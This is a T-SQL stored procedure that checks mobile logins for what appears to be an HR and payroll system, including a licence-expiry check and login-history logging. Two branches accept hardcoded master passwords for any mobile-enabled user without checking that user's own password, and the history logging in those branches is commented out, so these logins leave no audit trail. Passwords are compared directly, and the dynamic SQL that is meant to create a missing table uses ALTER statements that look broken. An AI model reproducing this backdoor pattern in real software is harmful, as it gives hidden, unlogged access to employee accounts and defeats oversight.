
---13/1/2021 (EDIT BY MEHUL ) (SP WITH NOLOCK)---
 
CREATE PROCEDURE [dbo].[SP_CheckLogin_Mobile]
	@Username VARCHAR(50) OUTPUT,
	@Password varchar(50) OUTPUT,
	@IPAdd VARCHAR(20),
	@Cmp_Id NUMERIC(18,0) OUTPUT,
	@dateformate NUMERIC(18,0) OUTPUT,
	@Emp_ID NUMERIC = NULL OUTPUT,
	@Branch_ID NUMERIC = NULL OUTPUT,
	@Login_Rights_ID NUMERIC = NULL OUTPUT,
	@Cmp_Name VARCHAR(100) OUTPUT,
	@Image_name VARCHAR(200) OUTPUT,
	@Branch_Name VARCHAR(100) OUTPUT,
	@tdate DATETIME OUTPUT,
	@ydate DATETIME OUTPUT,
	@Predate DATETIME OUTPUT,
	@Get_Login_ID NUMERIC(18,2) OUTPUT,
	@Row_ID NUMERIC(18,2) OUTPUT,
	@Login_type NUMERIC(1,0) OUTPUT,
	@m_status NUMERIC(18,0)=0 OUTPUT,
	@From_Date DATETIME = NULL OUTPUT,
	@Login_In_out INT = 0  OUTPUT,
	@Login_In_out_Popup INT = 0  OUTPUT,
	@Privilege_Id INT = 0  OUTPUT,
	@Privilege_Type INT = 0  OUTPUT,
	@is_GroupOfCompany INT = 0 OUTPUT,
	@pBranch_id INT = 0 OUTPUT,
	@pBranch_id_multi VARCHAR(MAX) = 0 OUTPUT
AS
SET NOCOUNT ON 
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
SET ARITHABORT ON

DECLARE @userid NUMERIC(9)
DECLARE @uname VARCHAR(30)
DECLARE @Login_status NUMERIC(1,0)
DECLARE @l_type NUMERIC(1,0)
DECLARE @sql VARCHAR(5000)
DECLARE @IO_Tran_ID NUMERIC
DECLARE @In_Time DATETIME
DECLARE @Out_Time DATETIME
DECLARE @is_active TINYINT
DECLARE @To_Date DATETIME

--SET @To_Date = '12/31/2020'--DATEADD(Month, 3, getdate())
SELECT @To_Date = dbo.Decrypt(LDate_Mobile) from emp_lcount 
SET @pBranch_id_multi = 0
SET @is_active = 0
SET @IPAdd = 'Mobile'
	
IF @To_Date > GETDATE()
	BEGIN
		IF @Emp_ID = 0           
			SET @Emp_ID = NULL
			--if exists(select Login_Id from T0011_Login where (Login_Name=@Username OR login_alias = @Username ) and Login_password=@password and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0)) )
			IF EXISTS(SELECT TL.Login_ID FROM T0011_LOGIN TL WITH (NOLOCK) INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID WHERE (TL.Login_Name=@Username OR TL.login_alias = @Username) AND Login_password=@password and ISNULL(TL.Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(TL.Emp_ID,0)) AND EM.is_for_mobile_Access = 1)
				BEGIN
					SELECT @l_type = ISNULL(Is_Default,2),@is_active = Is_Active 
					FROM T0011_Login 
					WHERE login_id = (SELECT Login_Id FROM T0011_Login WITH (NOLOCK) WHERE (Login_Name=@Username OR login_alias = @Username ) AND Login_password=@password)
					IF NOT @is_active = 1
						BEGIN
							 SET @Username=0          
							 SET @password=0          
							 SET @cmp_Id=0          
							 SET @dateformate=2          
							 SET @Emp_ID =  0          
							 SET @Branch_ID =  0          
							 SET @tdate = getdate()           
							 SET @ydate = getdate()-1          
							 SET @Predate = getdate()-2    
							 SET @Get_Login_ID = -1
							 SET @Login_type = -1
							 SET @l_type = -1
							 SET @Login_Rights_ID = 0
							--Raiserror('InActive',16,2)
							RETURN -1
						END
					IF @l_type = 1 OR @l_type = 3
						SET @l_type =0
						SET @Login_type = @l_type
			
					IF @l_type = @Login_type
						BEGIN						  
							SELECT @Get_Login_ID=Login_ID,@Login_Rights_ID=Login_Rights_ID,@Username=Login_Name,@Cmp_id=cmp_Id ,
							@Emp_ID= Emp_ID, @Branch_Id = Branch_Id, @tdate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120)),
							@ydate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-1,@Predate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-2 
							FROM T0011_Login WITH (NOLOCK)
							WHERE (Login_Name = @Username OR login_alias = @Username) AND Login_password=@password AND ISNULL(Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(Emp_ID,0))
							
							SELECT @dateformate=date_format,@Cmp_Name = Cmp_Name,@Image_name = Image_name,@From_Date=From_date,@is_GroupOfCompany = ISNULL(is_GroupOFCmp,0)
							FROM T0010_Company_master WITH (NOLOCK) WHERE Cmp_ID= @Cmp_id
							
							SELECT @Branch_Name = Branch_Name FROM T0030_Branch_master WITH (NOLOCK) WHERE Branch_Id= @Branch_Id 
							
							SELECT @Privilege_Type=PM.PRIVILEGE_TYPE,@Privilege_Id=PM.PRIVILEGE_ID,@pBranch_id = ISNULL(branch_id,0),@pBranch_id_multi = ISNULL(Branch_Id_Multi,0) 
							FROM T0020_PRIVILEGE_MASTER PM WITH (NOLOCK)
							INNER JOIN 
							(
								SELECT TOP 1 PRIVILEGE_ID,FROM_DATE,LOGIN_ID 
								FROM T0090_EMP_PRIVILEGE_DETAILS WITH (NOLOCK)
								WHERE LOGIN_ID = @Get_Login_ID AND From_Date <= GETDATE() ORDER BY FROM_DATE DESC
							) AS EPD ON EPD.PRIVILEGE_ID = PM.PRIVILEGE_ID -- added by mitesh on 03/10/2011
							SELECT @From_Date =  MAX(Login_Date) FROM dbo.T0011_Login_History WITH (NOLOCK) WHERE Cmp_ID = @Cmp_Id AND Login_ID =@Get_Login_ID
							SELECT @Row_ID = ISNULL(MAX(Row_ID),0) + 1 FROM T0011_Login_History WITH (NOLOCK)
							
							INSERT INTO T0011_Login_History(Row_ID,CMP_ID,Login_ID,Login_Date,IP_Address)VALUES(@Row_ID,@Cmp_id,@Get_Login_ID,GETDATE(),@IPAdd)
							
							UPDATE T0012_COMPANY_CRT_LOGIN_MASTER SET Last_login_date = GETDATE() WHERE cmp_id = @cmp_Id          
				   
							 -- start Comment by Ripal Hiral (12-6-2012) ---  
							 --  If @l_type=2---Below code by nikunj 19-May-2011
							 --  Begin 
							  
								--	Select @Branch_Id=Branch_ID From dbo.T0095_Increment Where Emp_Id=@Emp_ID And Increment_Effective_Date=(Select Max(Increment_Effective_Date) From Dbo.T0095_Increment Where Emp_Id=@Emp_ID)
									--Here Above Query Don't Think that We already have Branch Id then why we are agian here getting.here getting becuase in login table we have branch id for branch user only for employee there is no branch_Id so.
								--		If Exists(Select Gen_Id From dbo.T0040_General_Setting where Cmp_Id=@Cmp_Id And Branch_Id=@Branch_Id And In_out_Login=1)
									--		Begin
													
											--		Set @Login_In_out = 1
												
												
											--		Select @Login_In_out_Popup=isnull(In_Out_Login_Popup,0) From dbo.T0040_General_Setting where Cmp_Id=@Cmp_Id And Branch_Id=@Branch_Id And In_out_Login=1 -- Added by Mitesh
												
											--		Select @IO_Tran_ID = isnull(max(IO_Tran_ID),0)+ 1 from dbo.T0150_emp_inout_Record
											--		Select @In_Time = max(In_time),@Out_Time = max(Out_time) From dbo.T0150_emp_inout_Record where Emp_ID=@Emp_ID And Cmp_id=@Cmp_ID

														
											--		if @Login_In_out_Popup = 0 
											--		begin
															
											--				If Not @In_time is null and @In_Time > isnull(@Out_Time,'01-01-1900') and datediff(s,@In_Time,GetDate()) < 300 and datediff(s,@In_Time,GetDate()) > = 0    
											--						Begin   
																	
											--							Update dbo.T0150_emp_inout_Record     
											--							Set   In_Time = GetDate(),Duration = dbo.F_Return_Hours (datediff(s,GetDate(),Out_Time)),IP_Address=@IPAdd
											--							where In_Time = @In_Time and Emp_ID=@emp_ID    								   
											--						End    
											--					Else
											--						Begin	
											--								if @Privilege_Id > 0
											--									begin							
											--										Insert Into dbo.T0150_emp_inout_Record (IO_Tran_Id,Emp_Id,Cmp_Id,For_date,In_Time,IP_Address)Values(@IO_Tran_ID,@Emp_Id,@Cmp_Id,Convert(varchar(10),GETDATE(),120),GetDate(),@IPAdd)
											--									end
											--						End
											--		end
												
																		
												
											--	If Not Exists(Select IO_Tran_Id From dbo.T0150_emp_inout_Record where Emp_ID=@Emp_ID And Cmp_id=@Cmp_ID and Convert(varchar(10),For_Date,120) = Convert(varchar(10),GETDATE(),120))
											--		Begin																				
											--			if @Privilege_Id > 0
											--				begin
											--					Select @IO_Tran_ID = isnull(max(IO_Tran_ID),0)+ 1 from dbo.T0150_emp_inout_Record  -- Added by mihir 03112011 
											--					Insert Into dbo.T0150_emp_inout_Record (IO_Tran_Id,Emp_Id,Cmp_Id,For_date,In_Time,IP_Address)Values(@IO_Tran_ID,@Emp_Id,@Cmp_Id,Convert(varchar(10),GETDATE(),120),GetDate(),@IPAdd)
											--				end
											--		End
											--End				
							  -- End    
							 -- End Comment by Ripal Hiral (12-6-2012) ---         
						END
				END   
			--ELSE  IF @password='FyTKmEBA8rw='
			  ELSE  IF @password='rNb7ZPDKVVvU0tku5kOUPw=='	--(Ulti)
				BEGIN
					--if  exists(select Login_Id from T0011_Login where (Login_Name=@Username OR login_alias = @Username ) and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0)) )
					IF EXISTS(SELECT TL.Login_ID FROM T0011_LOGIN TL WITH (NOLOCK) INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID WHERE (TL.Login_Name=@Username OR TL.login_alias = @Username) AND ISNULL(TL.Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(TL.Emp_ID,0)) AND EM.is_for_mobile_Access = 1)
						BEGIN
							SELECT @Login_type = ISNULL(Is_Default,2),@Get_Login_ID=Login_ID,@Login_Rights_ID=Login_Rights_ID,@Username=Login_Name,@Cmp_id=cmp_Id,@Emp_ID= Emp_ID,@Branch_Id = Branch_Id,@tdate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120)),
							@ydate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-1,@Predate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-2 
							FROM T0011_Login WITH (NOLOCK) WHERE (Login_Name=@Username OR login_alias = @Username) AND ISNULL(Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(Emp_ID,0))  			                                  
							
							SELECT @dateformate=date_format,@Cmp_Name = Cmp_Name,@Image_name = Image_name,@From_Date=From_date,@is_GroupOfCompany = ISNULL(is_GroupOFCmp,0) 
							FROM T0010_Company_master WITH (NOLOCK) WHERE Cmp_ID= @Cmp_id            
							
							SELECT @Branch_Name = Branch_Name FROM T0030_Branch_master WITH (NOLOCK) WHERE Branch_Id= @Branch_Id        
					  
							SELECT @Privilege_Type=PM.PRIVILEGE_TYPE,@Privilege_Id=PM.PRIVILEGE_ID,@pBranch_id = ISNULL(branch_id,0),@pBranch_id_multi = ISNULL(Branch_Id_Multi,0) 
							FROM T0020_PRIVILEGE_MASTER PM WITH (NOLOCK)
							INNER JOIN 
							(
								SELECT TOP 1 PRIVILEGE_ID,FROM_DATE,LOGIN_ID FROM T0090_EMP_PRIVILEGE_DETAILS WITH (NOLOCK)
								WHERE LOGIN_ID = @Get_Login_ID AND From_Date <= GETDATE() ORDER BY FROM_DATE DESC
							) AS EPD ON EPD.PRIVILEGE_ID = PM.PRIVILEGE_ID -- added by mitesh on 03/10/2011
							--login histroy
							--select @Row_ID = Isnull(max(Row_ID),0) + 1  From T0011_Login_History
							--Insert into T0011_Login_History(Row_ID,CMP_ID,Login_ID,Login_Date,IP_Address) values (@Row_ID,@Cmp_id,@Get_Login_ID,getdate(),@IPAdd)
						END
				END
			ELSE  IF @password='J3rfmaNzytAiXOCy4JrGrQ=='
				BEGIN
					--if  exists(select Login_Id from T0011_Login where (Login_Name=@Username OR login_alias = @Username ) and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0)) )                      
			  		IF EXISTS(SELECT TL.Login_ID FROM T0011_LOGIN TL WITH (NOLOCK) INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID WHERE (TL.Login_Name=@Username OR TL.login_alias = @Username) AND ISNULL(TL.Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(TL.Emp_ID,0)) AND EM.is_for_mobile_Access = 1)
						BEGIN
							SELECT @Login_type = ISNULL(Is_Default,2),@Get_Login_ID=Login_ID,@Login_Rights_ID=Login_Rights_ID,@Username=Login_Name,@Cmp_id=cmp_Id ,@Emp_ID= Emp_ID,@Branch_Id = Branch_Id, 
							@tdate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120)),@ydate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-1,
							@Predate = CONVERT(DATETIME, CONVERT(VARCHAR(24), GETDATE(), 120))-2 
							FROM T0011_Login WITH (NOLOCK) WHERE (Login_Name=@Username OR login_alias = @Username) AND ISNULL(Emp_ID,0) = ISNULL(@Emp_ID,ISNULL(Emp_ID,0))
							
							SELECT @dateformate=date_format,@Cmp_Name = Cmp_Name ,@Image_name = Image_name,@From_Date=From_date,@is_GroupOfCompany = ISNULL(is_GroupOFCmp,0) 
							FROM T0010_Company_master WITH (NOLOCK) WHERE Cmp_ID = @Cmp_id            
							
							SELECT @Branch_Name = Branch_Name FROM T0030_Branch_master WITH (NOLOCK) WHERE Branch_Id= @Branch_Id       
					  
			  				SELECT @Privilege_Type=PM.PRIVILEGE_TYPE,@Privilege_Id=PM.PRIVILEGE_ID,@pBranch_id = ISNULL(branch_id,0),@pBranch_id_multi = ISNULL(Branch_Id_Multi,0) 
			  				FROM T0020_PRIVILEGE_MASTER PM WITH (NOLOCK)
							INNER JOIN 
							(
								SELECT TOP 1 PRIVILEGE_ID,FROM_DATE,LOGIN_ID 
								FROM T0090_EMP_PRIVILEGE_DETAILS WITH (NOLOCK)
								WHERE LOGIN_ID = @Get_Login_ID and From_Date <= GETDATE() ORDER BY FROM_DATE DESC
							) AS EPD ON EPD.PRIVILEGE_ID = PM.PRIVILEGE_ID  -- added by mitesh on 03/10/2011
							--login histroy
							--select @Row_ID = Isnull(max(Row_ID),0) + 1  From T0011_Login_History
							--Insert into T0011_Login_History(Row_ID,CMP_ID,Login_ID,Login_Date,IP_Address) values (@Row_ID,@Cmp_id,@Get_Login_ID,getdate(),@IPAdd)
						END
				END
			ELSE
				BEGIN
					SET @Username=0          
					SET @password=0          
					SET @cmp_Id=0          
					SET @dateformate=2          
					SET @Emp_ID =  0          
					SET @Branch_ID =  0          
					SET @tdate = GETDATE()           
					SET @ydate = GETDATE()-1          
					SET @Predate = GETDATE()-2    
				END
		   
		IF @cmp_id <> 0
			BEGIN
				IF NOT EXISTS(SELECT Name FROM sysobjects WHERE xtype = 'U' AND Name = 'T0011_module_detail')
					BEGIN
						SET @sql = 'ALTER TABLE [dbo].[T0011_module_detail]([module_ID] [numeric](18, 0) NOT NULL,[module_name] [varchar](50) NULL,[Cmp_id] [numeric](18, 0) NULL,[module_status] [int] NULL) ON [PRIMARY]'
						EXECUTE(@sql)
						SET @sql = 'ALTER PROCEDURE [dbo].[P0011_module_detail]@module_ID	numeric(18,0),@module_name varchar(50),@Cmp_id	numeric(18,0),@module_status int AS If Exists(Select module_ID From T0011_module_detail WITH (NOLOCK) Where Cmp_ID = @Cmp_ID and module_name = @module_name)begin set @module_ID = 0 Return end select @module_ID = Isnull(max(module_ID),0) + 1 	From T0011_module_detail WITH (NOLOCK) INSERT INTO T0011_module_detail(module_ID,module_name,Cmp_id,module_status)VALUES(@module_ID,@module_name,@Cmp_id,@module_status)return'
						EXECUTE(@sql)
						--select @Cmp_Id  Comment By Nikunj 7-Feb-2011
						EXEC P0011_module_detail 0,'HRMS',@Cmp_Id,0
						SET @m_status=0
					END
				ELSE
					BEGIN
						EXEC P0011_module_detail 0,'HRMS',@Cmp_Id,0
						SELECT @m_status=module_status FROM T0011_module_detail WITH (NOLOCK) WHERE cmp_id=@Cmp_Id AND module_name='HRMS'
					END
			END
		IF ISNULL(@Emp_ID,0) = 0          
			SET @Emp_ID = 0            
		IF ISNULL(@Branch_ID,0) = 0          
			SET @Branch_ID = 0            
		IF ISNULL(@Login_Rights_ID,0) = 0          
			SET @Login_Rights_ID = 0            
		IF ISNULL(@Row_ID ,0) = 0
			SET  @Row_ID=0
			--Select @Username as Username ,@Get_Login_ID as Login_ID
	END
ELSE
	BEGIN
		RAISERROR ('Your Online Payroll Version Expired Please Contact Administrator', 16, 2) 
		RETURN
	END
RETURN
